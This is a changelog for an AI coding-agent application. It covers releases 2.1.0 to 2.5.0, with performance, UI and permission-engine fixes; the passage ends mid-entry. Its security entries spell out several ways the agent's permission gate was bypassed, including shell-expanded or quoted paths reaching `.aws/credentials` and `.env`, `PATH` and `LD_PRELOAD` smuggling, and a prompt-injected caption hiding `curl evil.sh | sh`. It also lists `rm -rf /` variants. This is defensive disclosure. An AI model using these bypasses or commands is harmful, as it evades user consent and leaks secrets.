# Changelog

All notable changes to this project are documented in this file. The format
follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versioning
follows [Semantic Versioning](https://semver.org/).

## [2.5.0] — 2026-08-19

Two numbers explain most of this release. A shell command that runs in 26ms
took **4.4 seconds** to come back, on every call, because of a terminal nobody
was looking at. And TOON, adopted to save tokens, turned out to cost 10% more
of them — so it was kept only where it fixes something and reverted where it
did not.

### Added

- **TOON for structured tool results.** `grep` content mode, `web_search`,
  `task_list`, `task_get`, `agent_status` and authored `output: json` command
  tools now hand the model a header declaring the fields once, then one row per
  record:

  ```toon
  matches[2]{path,line,text}:
    C:\src\a.py,12,def run():
    src/b.py,44,"  run(), twice"
  ```

  The encoder is `quickcode/context/toon.py`, written against the spec rather
  than pulled in as a dependency, and pinned by 43 tests. The browser has a
  second copy — the model's tool arguments never pass through the server as
  text, so a TOON view of them can only be built there — and
  `tests/test_toon_parity.py` runs the same fixtures through both and demands
  identical bytes, because two implementations of one format drift.

  This is **not** the token saving TOON advertises, and the measurements are in
  the "Changed" section below. What it buys is a row count the model can check
  against the rows it actually got, and an unambiguous split. `path:line:text`
  was ambiguous the moment a Windows drive letter put a colon in the first
  field: every `C:\src\a.py:12:text` in this codebase's own search results
  parsed to a path of `C`.

- **Yolo mode can be reached without a launch flag.** Settings → General has an
  arming switch behind a confirmation. It was previously reachable only by
  starting the process with `--yolo`, which no desktop shortcut passes, so on an
  installed copy yolo did not exist. See the silent downgrade under "Fixed".

- **The provider balance, the response cap, and temperature are settings.**
  `GET /api/credits` reports what is left at OpenRouter (and says plainly that
  another provider does not publish one, rather than guessing). `max_tokens` and
  `temperature` are editable in Settings and in Quick settings. A provider
  reserves credit against `max_tokens`, so a small balance is refused outright
  with "insufficient credits … lower max_tokens" — and until now there was
  nowhere to lower it.

- **Copy buttons and a right-click menu.** Code blocks, message bubbles and
  agent output get a copy button; right-click offers copy, cut, paste and
  select-all. A WebView2 window has no browser chrome, so there was no menu at
  all for anyone who does not know Ctrl+C.

- **Compaction survives a restart.** A compacted conversation recorded its
  summary in the transcript but replayed the full history from disk, so reopening
  a session undid the compaction and the next turn paid for the whole thing
  again.

### Changed

- **The trajectory timeline is wall-clock.** The ruler read `+0.0s +0.1s +0.2s`,
  which was accumulated processing time, not time. It now spans session start to
  now, with clock-time pills across the axis, idle stretches collapsible so a
  20-minute think does not squeeze the work into a pixel, and a live edge that
  keeps moving while a tool runs.

- **A permission decision lives inside the tool call it decided.** It used to be
  a separate row underneath, which meant a card and its verdict could be pages
  apart, and the row broke the step grouping it landed in. The card now carries a
  lock badge — pending, allowed, denied — and the details on expand: what was
  asked, the rule that was offered, whether it was remembered. The decision is
  matched to its call by id (`call_id` now rides both permission events), so four
  parallel calls resolving out of order each badge the right card.

- **Tool arguments are shown as TOON, not re-rendered as JSON**, in the
  transcript and in the agents panel, so the panel shows what the agent got.

- **TOON was reverted where it cost tokens and fixed nothing.** Measured with
  `o200k_base` against this codebase's own output:

  | result | before | after |
  |---|---|---|
  | grep content, 20 matches | 440 tok | 493 tok (+12%) |
  | web_search, 5 hits | 250 tok | 250 tok |
  | task_list, 6 tasks | 88 tok | 122 tok (+39%) |
  | agent_status, 3 jobs | 132 tok | 82 tok (−38%) |
  | glob, 60 paths | 719 tok | 791 tok (+10%) |

  TOON's own benchmarks compare against JSON, which spends most of its tokens on
  braces and repeated field names. QuickCode never used JSON here; it used
  `path:line:text` and bare path lists, which are already at or below TOON's
  density. `grep` content keeps the table because the drive-letter split is a
  real defect. `agent_status` keeps it because XML attributes really were
  verbose. `task_list` keeps it and grew, because it now carries the owner,
  blocks and description that the old checklist silently dropped. `glob` and
  `grep`'s count and files-only modes went back to plain lines behind a
  `<files count="60"/>` marker, which is the half that was worth keeping: without
  it, a listing cut at the 200 cap looks exactly like a listing that found 200.

- **The test suite runs in 28 seconds instead of 60**, with 936 tests instead of
  860. Most of the saving was not the tests: `socket.socketpair()` on Windows
  falls back to a loopback TCP handshake whose `accept()` has no timeout, and
  asyncio builds every event loop's self-pipe with it. It was failing constantly
  rather than rarely, costing seconds per occurrence, spread invisibly across
  four files. The rest was sleeps replaced with waits on the actual condition,
  and two probe timeouts lifted into named constants so tests can drive them
  small.

### Fixed

- **Every shell command paid three seconds for a terminal.** `echo hi` returned
  in 4.4 seconds. ConPTY adds a flat ~3.0s to *every* command on Windows —
  measured at 3.113s for `bash -c`, 3.028s for `cmd /c`, 3.285s for PowerShell,
  against 0.03-0.20s as plain subprocesses. It is the pseudo-console teardown,
  not the shell: the command finishes in 26ms and the process stays alive for
  three more seconds. A session running forty commands spent two minutes waiting
  for terminals to close. Windows now runs commands on plain pipes (`QUICKCODE_BASH_PTY=1`
  restores the old behaviour); POSIX still gets a real pty, where it costs
  microseconds. Nothing is lost: colour was stripped before the model saw it
  anyway, progress bars arrived as carriage-return spam, and a program that
  prompts for input now reads EOF and exits instead of hanging until the timeout.
  `echo hi` is now 0.20s.

- **A permission profile asking for yolo was rewritten to `ask` in silence.**
  The gate was correct; saying nothing about it was not. The mode switch and the
  profile path now both state the refusal and what was applied instead, and the
  same goes for a mode capped by the project's ceiling.

- **No permission rule could name an MCP tool.** The rule grammar spelled the
  tool half as `\w+`, so a server called `company-kb` produced
  `mcp__company-kb__kb_search`, which no rule could match — and the profile
  validator called such a rule junk and dropped it. Tool names may now contain
  `-`, `.` and `:`, because servers name tools, we do not.

- **"Live" meant "opened once, ever".** A conversation opened earlier in the run
  was refused deletion and renaming for the life of the process, with a message
  telling the user to close a window that was not open. Live now means a socket
  is attached or a turn is running.

- **The copy button copied its own label.** It sits inside the block so it can be
  positioned against it, and `textContent` walks the subtree, so every copied code
  block ended with the literal word `copy`.

- **An always-allow could revoke the trust it was granted under.** Persisting a
  rule writes to `settings.local.json`, which moves the config hash the trust
  grant is keyed to, so approving something could untrust the project. The write
  is now wrapped in a re-grant that reads trust *before* it, and never grants to
  a project that was not trusted to begin with.

- **`/bin/cat` walked past a `bash(cat **)` deny rule**, because deny and ask
  rules were matched against the raw command rather than the normalised one.

- **Interrupt was inert on the subprocess path.** Stop told the user and the model
  the command had been interrupted while it ran happily to completion. That path
  is now the default on Windows, so it mattered more than it did.

- **The help panel said yolo still prompts on protected paths.** It has not since
  2.4.0. It also gains a section explaining what the mode pill, a permission
  profile, the ceiling and the yolo switch each decide, and which one wins.

## [2.4.1] — 2026-08-19

An adversarial sweep of 2.4.0 by seven independent agents, each required to
reproduce what it claimed. This release is the part of the result that could
hurt someone: four ways past the permission boundary, two ways to lose data,
and an update that could not be installed.

### Fixed

- **The installer could not replace a running QuickCode.** `DeleteFile failed;
  code 5 — access denied`, halfway through, on `QuickCodeApp.exe`. Windows'
  Restart Manager (`CloseApplications=yes`) asks a window to close and a
  WebView2 app does not answer in time, so Setup fell through to overwriting a
  file that was locked. The update path made this the *normal* case rather than
  an edge one: the app downloads the installer, launches it as a detached
  child, and keeps running — so every in-app update hit it. Setup now asks, then
  closes the running copy itself before it copies anything, and a silent
  install does it without asking. Declining is a clean abort rather than a
  half-written directory.
- **An upgraded install reported the version it replaced, for ever.** The
  frozen build carries its own distribution metadata, and the new one is called
  `quickcode-2.4.1.dist-info` — a *different* directory from
  `quickcode-2.4.0.dist-info`, so nothing overwrote it and
  `importlib.metadata` kept answering with the older of the two. `--version`,
  `/api/health` and the update check all lied, and the update check therefore
  offered the same update again every time. The stale metadata is removed on
  upgrade.
- **A path built from a shell expansion escaped the project boundary.**
  `cat $HOME/.aws/credentials` was **auto-allowed in every mode**, including
  `plan` — which the docs sell as read-only research — and `dontask`, because
  the engine compared the literal string `$HOME/.aws/credentials`, saw a
  relative path, and concluded it was inside the project. The same file named
  plainly prompted. Anything holding an unexpanded `$VAR`, `${VAR}`, `$(…)`,
  backticks or `%VAR%` is now treated as protected: the shell expands it long
  after this decision is made, and "unknown" is not "safe". The cost is that a
  read-only builtin referencing a variable (`echo $HOME`) now prompts too — the
  engine genuinely cannot tell that from `cat $SECRETS`.
- **Quoting hid a protected name from the same check.** `cat .en''v` reached
  `.env` with no prompt in any mode, because quotes were stripped only from the
  ends of a token while the shell concatenates them in the middle. They now come
  out wherever they sit.
- **`glob` never gated its pattern.** It declared `path` as its permission
  target — an *optional* argument — while the place it actually reads is `path`
  joined with the required `pattern`. So `glob(pattern="../*/*.txt")` handed the
  engine an empty target and enumerated filenames anywhere the process could
  reach, unprompted, in every mode. A tool can now declare its effective
  location (`Tool.permission_target`), and `glob` does.
- **The catastrophic-command breakers matched one spelling each.** `rm -rf /`
  stopped; `rm -fr /`, `rm -rf /*`, `rm --recursive --force /` and `git push -f`
  did not — the same commands, and in yolo the breakers are the only thing
  left. They are written now as "those flags, in any order or long form, then
  that target".
- **"Clean up empty sessions" could delete the entire project directory.** A
  file named `...jsonl` in `.quickcode/sessions/` made the sweep offer `..` as a
  session id; the task board it then removed is `.quickcode/tasks/<id>`, and
  `.quickcode/tasks/..` is `.quickcode` itself. One click took every session,
  every task board, every artifact and the project's settings. Ids that are
  really paths are refused now, both where they are listed and where they are
  deleted.
- **Two sessions offloading the same subagent id destroyed each other's
  reports.** Agent ids come from a counter that restarts at 1 in every
  conversation, so `explore-1.md` is the first offloaded report of *every*
  session — and it was written with a plain overwrite. Opening a new
  conversation and fanning out silently destroyed the previous session's
  report, while that session's transcript went on pointing at the file, now
  describing someone else's work. Three reports in this repository were already
  lost that way. The name is claimed with `open(..., "x")` and the next free
  `-2`, `-3` … is taken instead.

## [2.4.0] — 2026-08-19

### Added

- **Projects can be deleted, which was previously impossible.** `ProjectRegistry`
  had `touch`, `list` and `get` and no way to remove anything, and no route
  called for one: a directory opened once sat on the home screen for good. It is
  two separate actions, because "delete a project" is an ambiguous thing to ask
  a program to do. **Remove from list** drops the entry in
  `~/.quickcode/projects.json` and touches nothing on disk — reopening the folder
  brings it back unchanged. **Delete QuickCode's data** removes
  `<project>/.quickcode` (sessions, task boards, artifacts, project settings)
  and the project's trust grant, behind a dialog that names the resolved
  directory and counts what is in it. Both refuse a project with a live
  conversation, the same way deleting a live session already did.

  The deletion is gated by one function that resolves both ends with `realpath`
  and returns a path only when it is *exactly* `<resolved root>/.quickcode`,
  re-checked immediately before the tree goes. Two ways out of that boundary are
  closed explicitly, and both are tested against the real thing rather than a
  mock: a **Windows directory junction answers `False` to `Path.is_symlink()`**,
  so the symlink refusal is not what protects you — the realpath comparison is;
  and `shutil.rmtree` *recurses into* a junction found inside the tree, so a
  link under `.quickcode` would have carried the delete out of the project
  entirely. A link anywhere in there now stops the purge and gets named.
- **Multi-select on projects and sessions**, in all three lists — the home
  cards, the per-project session rows, and the session switcher. Checkboxes,
  select-all, shift-click ranges, Escape to clear, a bar that names the action
  in full ("Delete 3 sessions", "Remove 2 projects from the list"), and
  selection that survives a re-render but never crosses a project or a view.
  Results are reported per item: *"Deleted 3 sessions; 2 left alone (2 still
  open)"* rather than a blanket success.

### Fixed

- **Yolo asked for permission.** The mode whose entire promise is that it does
  not interrupt stopped and waited anyway, because the protected-path rule ran
  before the mode was ever consulted. For `bash` that was constant: every
  non-option token is treated as a possible path, so a plain
  `find / -name "*x*"` prompted on the `/`. The gate for yolo is entering it —
  a confirmation screen, a persisted acceptance, a red status pill — not a
  second conversation per command. It no longer prompts. Deny rules still deny
  in yolo and the four circuit breakers still stop; `docs/PERMISSIONS.md` and
  its machine-checked tests were rewritten to state the new boundary rather
  than quietly relaxed, including that `$(rm -rf /)` and `rm -rf ../outside`
  are no longer caught there — they used to be, through the protected-path
  scan, and in yolo the four breakers are now the whole of what stops.
- **Stop did not stop anything.** The read-only batch raced the cancel signal;
  mutating calls were awaited outright. So pressing Stop during a long command
  set a flag nobody was waiting on — the transcript printed "(interrupt
  requested)" once per press while the turn sat inside the command until its
  own timeout, which for a `find /` is minutes. Cancelling the coroutine alone
  would not have been enough either: `bash` runs in a worker thread and the
  child process outlives it. Tools now declare whether they may be cut off,
  `bash` does and kills its process tree on the way out, and the loop races it
  against the interrupt. `write` and `edit` stay uninterruptible on purpose — a
  file truncated halfway is worse than an interrupt that waits for it to land.

## [2.3.0] — 2026-08-19

### Changed

- **QuickCode is a frozen application now.** The Windows installer used to
  require Git and Python ≥3.12 on your machine, build a private virtualenv
  under the install directory and pip-install into it. It now copies a
  self-contained PyInstaller *onedir* build into
  `%LOCALAPPDATA%\Programs\QuickCode`: no Python, no venv, no network, nothing
  to go wrong on a machine that happens to have an odd Python. Startup got
  faster rather than slower — process start to the port answering is **1.06 s
  frozen against 1.57 s from source**, because a onedir build memory-maps its
  interpreter out of the install folder instead of paying import cost through a
  venv. Note the CLI keeps the name `quickcode.exe`; the windowed entry point is
  `QuickCodeApp.exe`, because Windows filenames are case-insensitive and
  `QuickCode.exe` and `quickcode.exe` are the same file — PyInstaller built both
  and silently kept one, which is a footgun the spec now fails loudly on.
  `pip install quickcode` is unaffected; the wheel and sdist still ship.

### Fixed

- **Starting the app waited on the network.** Opening a project awaited the
  provider's model catalog — 415 models, measured at 3.2 s — before uvicorn had
  even bound its port, and then the launcher slept a further hardcoded 400 ms
  before asking for a window. So "QuickCode is slow to start" was really
  "QuickCode is waiting for openrouter.ai", and on a slow link it was worse.
  The catalog is now fetched *after* the port is bound; backgrounding it alone
  was not enough, because parsing 400 models runs on the same event loop and
  still beat uvicorn to the punch. The window opens the moment the server is
  listening, context lengths fill themselves in when the catalog lands, and
  **time to window went from ~4.1 s to ~1.15 s**. Five tests pin the contract —
  nothing on the boot path may ask the provider for anything — rather than
  pinning a stopwatch.
- **The side-panel tabs lost their names.** A container query dropped every
  label below 490 px — one pixel under the default panel width — so narrowing
  the panel at all left five two-character sigils with no way to tell
  Trajectory from Tasks. Labels now survive at every width; the strip scrolls
  and keeps the active tab in view.
- **The agents roster lied about what was running.** The provider emits
  `TurnDone` once per *round*, not once per turn, so a subagent that said
  anything before calling a tool was marked finished within seconds of starting
  — counted as done, hidden behind the "running" filter, and its live output no
  longer rendered at all. `finish_reason` was already on the event and simply
  unused. Alongside it: the roster printed **“−1 done”** because it collapsed
  *failed* and *done* into one status and then subtracted; chat cards rendered
  every round twice and then lost it; tool calls cut off by Stop span forever
  and leaked into the next turn's activity line; subagents killed by an
  interrupt read as running for the rest of the session; a subagent that died
  without a closing message never went terminal at all; and the trajectory
  inspector claimed every subagent tool call had no result, because it only
  matched top-level `tool_result` events and a subagent's are wrapped.
- **The UI stayed cheerful while disconnected.** A dropped socket left the
  status line saying `streaming`, the Stop button visible and inert, and — worst
  — **a message typed into a dead socket was cleared from the composer and
  thrown away**, because `send()` returned `false` and nobody looked. The
  composer now only clears once the socket takes it, every refused frame says
  what did not happen, and a graded banner reports the outage: silent under
  1.2 s (the server closes with 1013 on purpose to force a replay), then
  "Reconnecting…", then an alert with the outage length and a retry button. Two
  reconnect bugs went with it: a conversation the server no longer has closed
  4404 *after* accepting, and the backoff reset on `onopen`, so the client
  retried twice a second forever in silence; and the transcript blanked for the
  entire outage because the reset ran on the drop rather than on the first frame
  of the socket that replaces it.
- **A sleeping laptop left a socket that was open and dead.** Sends succeeded
  into the void and, on an idle conversation, no frame ever arrived to prove
  otherwise. The server now sends a heartbeat every 15 s of quiet and the client
  closes a socket that has missed three, turning an invisible dead connection
  into the ordinary reconnect it already knows how to do.
- **`quickcode -p` never compacted**, because its agent was built with no
  context length, so the threshold check could not fire and a `--continue` chain
  grew without bound. The model's context window is now learned alongside the
  turn rather than in front of it.
- **Endings are announced now, instead of inferred.** An audit of every way a
  run can stop found several that said nothing at all, and readers were left to
  guess from the last event they happened to see. A `tool_call` cut off by an
  interrupt never got a `tool_result` — on three separate paths — so its spinner
  turned forever, on replay as well as live; every result now goes through one
  recorder with a `finally` sweep that guarantees exactly one per call. An
  interrupt during streaming emitted no status at all, so the half-sentence sat
  in the accumulator and reappeared glued to the front of the *next* turn's
  message. A round cut off mid-flight logged its usage but never counted it, so
  the same session cost two different amounts depending on whether you read it
  live or reopened it. `busy` could stay true forever — Stop up, composer dead —
  if the interrupt landed while a permission modal was pending, because nothing
  resolved the future the tool was waiting on. `agent_done` fired only for
  detached jobs; blocking spawns and resumes emit it too now, and it no longer
  overtakes the events it closes. And a subagent that errored or was cancelled
  handed its parent a report marked as success, which is how a green tick ended
  up over a dead agent — the tool result carries the run's real status.
- **The test suite could hang indefinitely**, taking a release gate with it.
  Diagnosed with live stack dumps: creating an asyncio event loop on Windows
  builds its self-pipe with `socket.socketpair()`, which binds a loopback
  listener and calls `accept()` with no timeout — and that call blocks forever
  often enough to matter. It is not this codebase's code and the selector loop
  shares the same self-pipe, so there is nothing here to fix; a per-test
  deadline (`pytest-timeout`) now turns a hang into a loud failure with a stack
  instead of a gate that never returns.

## [2.2.0] — 2026-08-18

### Fixed

- **Four parallel reads could hang the agent forever.** Read-only tool calls in
  one assistant message run concurrently, so four `read`s against a protected
  path opened four permission futures at once, each awaiting its own decision.
  The web UI showed one dialog at a time and let every new request wipe the one
  on screen — while still recording it as "shown", so it could never be offered
  again. You answered the last prompt; the other three futures waited on a
  decision it was no longer possible to give, the round's `asyncio.gather` never
  completed, and the turn sat at "Running read…" for eight minutes. Reviews are
  a queue now: one dialog at a time, in arrival order, each answered on its own,
  with "N more requests waiting behind this one" so a blocked fan-out looks like
  what it is. `state.pending` re-seeds the queue, so a reconnect or a lost frame
  recovers instead of stranding. And a review dialog no longer closes on Escape,
  the backdrop or a ✕ — the agent is waiting on an answer, and "no" is the Deny
  button, which it hears. If another dialog displaces a live review, the review
  comes back rather than vanishing.
- **A subagent's own report needed permission to read back.** QuickCode offloads
  a large report to `.quickcode/artifacts/<agent_id>.md` and then tells the model
  to go read it — but `.quickcode` is a protected path, so that read prompted in
  every mode, yolo included. Reads under the project's own artifacts directory
  now fall through to normal rule evaluation. Deliberately narrow: writes and
  edits to the same path still prompt, the rest of `.quickcode`, `.git`, `.ssh`
  and `.env*` are untouched, and a `..` or symlink that only *starts* inside the
  directory still asks. Skipping the prompt is not the same as an allow — a deny
  rule still denies.
- **Agent cards collapsed into empty slivers once there were enough of them.**
  The card list is a flex column, and a card sets `overflow: hidden`, which
  resolves its automatic minimum size to zero — so with forty subagents the
  browser squeezed every card down to a 14px bordered line with its text clipped
  out of existence. Nothing was wrong with the markup, which is why it looked
  like the panel had died. Cards keep their natural height; the list scrolls.
- **Compaction erased what the session had spent.** `run_compaction` zeroed the
  cumulative `input_tokens` / `output_tokens` rather than the last request's
  footprint, so compacting reset the bill to nothing — and a live session then
  disagreed with the same session reopened from its log, which rebuilds spend
  from `usage` events. It now clears `last_input_tokens` / `last_output_tokens`,
  which is what the comment always said it was for and what actually unpins the
  context meter from the threshold that fired.
- **Tokens per second read high during a fan-out**, because it was derived from
  the ledger's output delta and subagent output now lands there. A fan-out of
  four would have reported four times the rate the streaming model ran at.
- **The delegation tool set was hardcoded in two more places** than the list that
  defines it: a preset with no spawns stripped only `agent` and `send_message`,
  and an authored plugin could still claim the name `agent_status` or
  `agent_result` and be called in place of the real tool.

### Added

- **Subagent jobs that do not block the turn.** `agent(background: true)` returns
  an `<agent_job/>` handle immediately; `agent_status` lists what is running and
  what is uncollected; `agent_result` fetches a finished report — the same
  sanitized, offloaded report a blocking call returns — and can wait for one the
  model now needs. A finished job emits `agent_done` and queues a reminder, and a
  turn that would end with jobs in flight is told so by name. Live parallelism is
  capped (default 4, settable 1–16) and going over is an error naming the running
  ids, never a queue that waits forever. Headless `-p` cannot own a detached
  task — the process ends with its turn — so it runs the delegation inline and
  says so, rather than failing a call the model would only have to reissue.
- **A fleet view that survives fifty subagents.** A third layout wraps cards into
  columns *and* rows; each transcript follows its newest line until you scroll
  away, then offers "↓ latest" to re-pin. Only the cards you can see build their
  transcripts, so opening the panel mid-fan-out no longer stalls. Plus a filter
  box, all/running/done/errors chips, a live one-line summary of what each
  collapsed agent is doing, denser cards past eighteen, and a solo view for one
  agent full-panel. Side-by-side columns size to the panel instead of a fixed
  340px, which at the default width showed one column and a sliver of the next.
- **Usage counts subagents.** A child's `usage` events are now logged (inside the
  existing `agent_event` wrapper — the schema widens, nothing is repurposed) and
  rolled into the session's cumulative tokens and cost, so a fan-out of ten no
  longer reports as free. They are deliberately kept out of `last_input_tokens` /
  `last_output_tokens`: that pair is the *parent's* live context footprint, and
  counting a subagent's request there would show a short conversation as nearly
  full and could trip an auto-compaction it never needed. The panel gains a
  subagents pill, a per-turn subagent share, and a per-agent table.
- **Conversation tabs, and sessions you can name.** `PATCH /api/sessions/{id}`
  writes a `meta` title; the listing reads the *last* one written, because in an
  append-only log reading the first would show the name you just replaced.
  Renaming a live conversation is allowed where deleting and archiving are not —
  a rename appends one record, it does not move the log out from under its own
  writer. The topbar shows recent conversations as tabs with a `+N` overflow into
  the existing switcher. The tabs are honest about being shortcuts: the browser
  holds one socket, so switching leaves the conversation you are in, and no tab
  claims background activity it cannot have.
- **`/init`**, which asks the agent to survey the repo and write `QUICKCODE.md`
  through the ordinary `write` tool — so the permission engine stays in the loop —
  and offers to update rather than overwrite when one already exists.
- **`@` path autocomplete** in the composer, backed by a new project-scoped paths
  route that clamps every query to the project root and never offers `.git`,
  `.quickcode`, `.ssh` or `.env*`.
- **Toasts**, replacing the one raw `window.alert` in the app, and **input history
  that filters by what you have typed** — type `git`, press ↑, and you walk only
  the entries that start with it. Slash commands no longer land in history.
- **Automatic compaction in headless runs.** The web path has checked the
  threshold after every turn for a while; `-p` never did, so a `--continue` chain
  grew without bound. The model's context window is fetched alongside the turn
  rather than before it, because a one-shot CLI should not pay a network round
  trip before it starts working; if the catalog is unreachable, nothing changes.

## [2.1.0] — 2026-08-18

### Added

- **Permission profiles — name a posture and switch to it.** The engine was
  already granular: `allow: ["bash(git *)"]` works, and `allow: ["glob(**)"]`
  with `deny: ["read(**)"]` gives you "list the tree but don't open files".
  What you could not do was *name* a combination and select it; rules were a
  flat per-project list you hand-edited in JSON. A profile is that named
  bundle — a starting mode plus the three rule lists — and it hands both to the
  existing engine rather than duplicating any decision logic. Four built-ins:
  **Read only** (reviewing a PR or auditing a fresh clone — and it still denies
  writes at `yolo`, because the rules hold where the mode doesn't), **Git
  only** (with `push`, `reset --hard` and `clean` carved back out), **Survey**
  (names, not contents — it denies `read` and `grep` *and* `cat`/`head`/`rg` in
  the shell, since those are read-only builtins that would otherwise
  auto-allow), and **Build and test** (named runners only; `make all` and
  `npm run deploy` still ask, because each runs an arbitrary program out of a
  file in the repo). Pick one from the composer beside the mode pill, or manage
  them in Settings, where the rule editor previews what a rule would decide as
  you type. A profile's rules are *unioned* with the session's, never
  substituted — otherwise selecting one would silently revoke every "always
  allow" you had accrued.
- **A Help view** at `#/help/…`, a peer of Configuration. Settings deliberately
  shows the whole install; this is the map for it. Its centrepiece is a
  hand-built diagram of one turn in the real order the loop runs — your
  message, the assembled request, the streaming answer, then a fork into "it
  asked for tools" (the gate, execution, and the arc back) and "it asked for
  nothing" — with the event bus, session log, trajectory, compaction, subagents
  and round budget hanging off the side. Every box deep-links into the Settings
  page that governs it, and the links are checked against the live kernel
  before being offered. Also: the plugin model, the six explanation questions, a
  first-session walkthrough, and three hands-on widgets. Two are live; the
  permission sandbox is a JS port of the engine and says so on its face,
  including the one thing a browser cannot do — resolve paths, so it misses a
  symlink pointing out of the project.

- **The agent can read the web, and search it.** Two new tools. `web_fetch`
  retrieves one URL and hands back readable text, following up to five
  redirects and revalidating the destination at every hop. `web_search`
  queries one configured engine — Brave, Serper, Tavily, SearXNG, Exa or
  Google Programmable Search — and returns titles, URLs and snippets. There is
  deliberately no `provider` argument: the engine is the user's choice, not
  the model's, and there is no silent fallback to a second one when the first
  fails. Neither tool is available until a key is configured (SearXNG needs
  only an instance URL), and `quickcode doctor` now reports which provider is
  selected, where its key resolved from, and what is missing — as a warning,
  never a failure, because search is optional and an unconfigured one breaks
  nothing else.
- **The search provider is configurable from the app.** Install gains a "Web
  search" tab — not Settings → General, because General is about the *model*
  endpoint and two unrelated things both called "provider" in one form is how a
  search key ends up pasted into the model key field. The page is driven
  entirely from each provider's own declaration, so Brave, Serper, Tavily and
  Exa render a key field, SearXNG renders a base URL and no key field at all
  because it is keyless, and Google CSE renders a key plus its engine id. Keys
  and settings travel by separate routes: the config route refuses an API key
  *by name*, naming the right one, rather than dropping it silently — a key
  quietly ignored is a key you believe is set. No key, or any part of one,
  appears in any response; the field is never populated. And because an
  environment variable outranks a key saved from this page, the page now says
  where the key actually in use came from, sharing its exact wording with
  `quickcode doctor` so the two cannot drift.
- **`web_fetch` refuses to be turned inward.** It is the first tool that sends
  a request from the user's machine, chosen by the model, so the address is
  classified before every hop: no schemes but http and https, no embedded
  credentials, no loopback or link-local or private or CGNAT ranges, no
  `.local`/`.internal`-style names, no bare dotless hostname, and no
  IPv4-mapped or 6to4 or Teredo address smuggling one of those through. A name
  resolving to several addresses is refused if *any* of them is disallowed.
  The connection is then made to the address that was checked, with the
  original hostname kept for SNI and `Host`, so a name cannot resolve
  differently between the check and the connection. Cookies are dropped
  between hops. `docs/TOOLS.md` documents the gaps this does **not** close —
  a public host that proxies inward is invisible at this layer, and a
  configured `HTTP_PROXY` weakens the guarantee to "a name that passed the
  checks".
- **QuickCode tells you when there is a new release.** One unauthenticated
  `GET` of the GitHub releases API, at most once every six hours, cached under
  `~/.quickcode`. It carries no key, no cookie, no identifier, no project
  path, no session data and no version number; the entire request is printed
  verbatim on its Settings card so the claim can be checked rather than
  trusted. A failed check is silent — the chip simply does not appear — and
  the reason waits on Install → Updates for anyone who looks. It can be turned
  off in two places, and off means nothing is sent at all, including by the
  "Check now" button. On the Windows installer layout it offers the download:
  the release's `SHA256SUMS.txt` is fetched *before* any executable byte is
  written, the bytes are hashed as they stream to a `.part` file, a mismatch
  deletes the file before reporting it, and the installer is re-hashed from
  disk immediately before it is launched. Every other install method is told
  the command to run instead, because a process cannot reliably replace the
  package it is executing.
- **You can see that it is working.** A line above the composer shows an
  animated glyph, a verb, the elapsed time and the tokens produced this turn:
  `✳ Nebulizing… (4m 7s · ↓ 5.3k tokens · esc to interrupt)`. The whimsy stops
  where the information starts — a verb appears only while waiting on the
  model; running a tool names the tool, because someone watching a long call
  needs to know it is the tool and not the model; compaction says so; and a
  pending permission or plan review says the app is waiting on *you*, since a
  spinner implying progress would be a lie while nothing moves. The Esc hint
  is printed only when Esc actually interrupts, which it does not while a
  modal is open.

### Security

- **The permission dialog showed a caption instead of the command.** A bash
  call rendered as `Bash: <description>` and dropped the command entirely — and
  the description is written by the model. One real dialog read *"Query ONVIF
  device service unauthenticated"* while the rule it offered to save was
  `bash(echo *)`; the two did not even agree. This is the one string standing
  between a tool call and consent, and bash — the tool with the widest blast
  radius — was the only one substituting prose for the thing being approved;
  `Read`, `Edit`, `Fetch` and `Search` all name their real target. Nor is it
  only cosmetic: the model writing that caption may be repeating text out of a
  file it just read, so the label is reachable by anything that can put words
  in front of the model, and a benign caption over `curl evil.sh | sh` is one
  click from consent nobody knowingly gave. The command is now always shown,
  with the description beside it rather than instead of it, and a multi-line
  command is marked so a heredoc whose second line is `rm -rf /` cannot look
  like a one-line echo.
- **An MCP server's credentials were printed in the UI.** `env` is how an MCP
  server is handed a live API token, and the whole config block was serialised
  into the plugin's view verbatim — reachable from any MCP card and from inside
  the trust banner, which is the one moment a user is most likely to be sharing
  their screen. The values are redacted now; the key names stay, because
  deciding whether a server should receive a token at all is what the review is
  for. Display only — the config the server is started with is untouched.
- **Four ways past the permission boundary, all reproduced, all closed.** A
  compliance audit found them and each was verified by hand before and after
  the fix.
  - `PATH=. ls` ran **unprompted in every mode, `plan` included**. Environment
    assignments were stripped before the read-only auto-allow was computed and
    then never looked at again, so the command read as a harmless `ls` while
    the environment it would run under had been rewritten. Any assignment now
    disqualifies the auto-allow, and the stripped form is no longer offered to
    allow rules — approving `git status` is not approving
    `LD_PRELOAD=./x.so git status`. Deliberately *any* assignment rather than a
    blocklist of dangerous names: such a list would have to be complete and
    cannot be, since `PATH` and `LD_PRELOAD` sit beside `BASH_ENV`, `IFS`,
    `GLOBIGNORE`, `NODE_OPTIONS`, `LESSOPEN` — and `RIPGREP_CONFIG_PATH`, which
    points `rg` (itself a read-only builtin) at a config file that can set
    `--pre`, which runs a program. The set grows with every program installed.
  - **`grep` and `glob` read any file on the machine, unprompted, in every
    mode.** Their permission shape omitted the path check that `read` has, so
    `grep(output_mode="content")` returned the contents of `~/.ssh` and
    `~/.aws/credentials` while `read` on the same path correctly prompted. A
    test now asserts no built-in tool targets a path-shaped field without
    declaring it. Separately, `grep` now skips `.ssh` and `.env*` while
    *walking* — gating the named path did not stop a project-wide grep
    returning `.env` contents.
  - **A cloned repository's committed `permissions.allow` took effect with no
    consent**, in both project settings files. `.local` is a filename
    convention, not a statement about where a file came from.
  - **A committed `default_mode: "yolo"` started the session in bypass mode**,
    by two separate routes, contradicting `docs/PERMISSIONS.md` explicitly.

  The last two now route through the existing trust gate rather than a second
  mechanism. The dividing line is *direction*: rules that only narrow — `deny`,
  `ask`, disabling a plugin, lowering the starting mode — load from any
  project, because narrowing needs no consent. Anything that widens needs the
  grant. A project may lower the starting mode without asking and never raise
  it. Policy config joins the trust hash under its own key and only when
  non-empty, so grants already on disk stay valid while a project that *later*
  adds policy config re-prompts — trusting a repository for its MCP servers
  must not silently bless a `default_mode: yolo` committed afterwards. None of
  it is silent: every drop is logged, the ignored keys are named, and the trust
  banner is raised for a settings-only refusal, since otherwise the page would
  tell you to trust the project with no way to do it.
- **Session transcripts were one `git add -A` away from being published.**
  QuickCode writes full transcripts — every prompt, every file it read, every
  line of command output, anything pasted into the chat — to
  `<project>/.quickcode/sessions/*.jsonl`, and nothing arranged for git to
  ignore them. Of everything a compliance audit turned up this was the most
